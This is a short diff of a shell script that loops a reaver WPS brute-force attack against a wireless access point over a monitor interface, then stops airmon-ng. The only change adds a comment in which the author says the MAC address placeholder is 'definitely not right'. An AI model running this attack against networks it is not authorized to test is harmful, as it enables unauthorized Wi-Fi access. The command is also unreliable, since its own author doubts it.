@@ -18,7 +18,8 @@ while :; do echo
 	
 	#running reaver
 	echo "And here, we, go..."
-	echo y|reaver -i mon0 -c 6 -b <MAC_ADDRESS> -c1 -vv -t 20 -n -d 10 -g 1 -L
+	echo y|reaver -i mon0 -c 6 -b <MAC_ADDRESS> -c1 -vv -t 20 -n -d 10 -g 1 -L # Totally forget what I was 
+	# trying to achieve with the "<MAC_ADDRESS>", definitely not right, will need to test and ammend.
 	
 	airmon-ng stop mon0
 	
